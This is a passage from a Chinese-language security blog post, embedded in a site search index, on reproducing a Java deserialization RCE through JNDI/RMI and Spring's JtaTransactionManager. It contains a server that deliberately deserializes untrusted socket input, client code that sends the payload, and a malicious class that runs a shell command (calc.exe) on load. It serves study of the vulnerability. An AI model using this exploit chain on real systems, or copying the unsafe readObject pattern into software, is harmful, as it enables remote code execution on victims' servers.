System.out.println(<span class="string">"Sending object to server..."</span>);</span><br><span class="line">            ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(socket.getOutputStream());</span><br><span class="line">            objectOutputStream.writeObject(object);</span><br><span class="line">            objectOutputStream.flush();</span><br><span class="line">            <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li>可以看到客户端首先启动一个HTTP服务来提供JNDI将要远程加载的恶意类</li>
+<li>接下来注册并启动RMI服务，然后通过<code>References</code>类 绑定 我们HTTP服务提供的恶意类</li>
+<li>最后就是RMI的调用过程了</li>
+</ul>
+<h3 id="服务端-1"><a href="#服务端-1" class="headerlink" title="服务端"></a>服务端</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExploitableServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ServerSocket serverSocket = <span class="keyword">new</span> ServerSocket(Integer.parseInt(<span class="string">"1111"</span>));</span><br><span class="line">            System.out.println(<span class="string">"Server started on port "</span> + serverSocket.getLocalPort());</span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                <span class="comment">//等待连接</span></span><br><span class="line">                Socket socket = serverSocket.accept();</span><br><span class="line">                System.out.println(<span class="string">"Connection received from "</span> + socket.getInetAddress());</span><br><span class="line">                ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(socket.getInputStream());</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">//读取对象</span></span><br><span class="line">                    Object object = objectInputStream.readObject();</span><br><span class="line">                    System.out.println(<span class="string">"Read object "</span> + object);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    System.out.println(<span class="string">"Exception caught while reading object"</span>);</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>服务端的代码很简单，就是一个读取序列化数据再进行反序列化的过程<blockquote>
+<p>服务端收到客户端的payload，然后去访问客户端RMI服务，客户端RMI服务访问HTTP服务提供的恶意类，读取恶意类然后返回给Server，Server端接收序列化数据进行反序列化然后触发我们构造的恶意代码造成RCE</p>
+</blockquote>
+</li>
+</ul>
+<h2 id="本地复现"><a href="#本地复现" class="headerlink" title="本地复现"></a>本地复现</h2><p>我们首先启动服务端，再启动客户端，<br><img src="./ExpServer.png" alt="ExpServer"></p>
+<p><img src="1.png" alt=""><br><img src="2.png" alt=""><br><img src="3.png" alt=""><br><img src="4.png" alt=""><br><img src="5.png" alt=""><br>以上就是调用栈了</p>
+<ul>
+<li>恶意类<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExportObject</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		String sb = <span class="string">""</span>;</span><br><span class="line">		BufferedInputStream in = <span class="keyword">new</span> BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());</span><br><span class="line">		BufferedReader inBr = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(in));</span><br><span class="line">		String lineStr;</span><br><span class="line">		<span class="keyword">while</span> ((lineStr = inBr.readLine()) != <span class="keyword">null</span>)</span><br><span class="line">			sb += lineStr + <span class="string">"\n"</span>;</span><br><span class="line">		inBr.close();</span><br><span class="line">		in.close();</span><br><span class="line">		<span class="keyword">return</span> sb;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">ExportObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		String cmd=<span class="string">"calc.exe"</span>;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> Exception(exec(cmd));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+利用 JtaTransactionManager 类中可以被控制的 readObject() 方法，从而构造恶意的被序列化类，其中利用 readObject() 会触发远程恶意类中的构造函数这一点，达到目的。<br>最后贴上结果：<br><img src="./result.gif" alt=""></li>
+</ul>
+<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><ul>
+<li><a href="https://blog.csdn.net/xinghun_4/article/details/45787549" target="_blank" rel="noopener">java RMI原理详解</a></li>
+<li><a href="https://kingx.me/Exploit-Java-Deserialization-with-RMI.html" target="_blank" rel="noopener">深入理解JNDI注入与Java反序列化漏洞利用</a></li>
+<li><a href="https://paper.seebug.org/312/#6-java-apache-commonscollections-rce" target="_blank" rel="noopener">seebug-深入理解 JAVA 反序列化漏洞</a></li>
+</ul>
+]]></content>
+  </entry>
+</search>
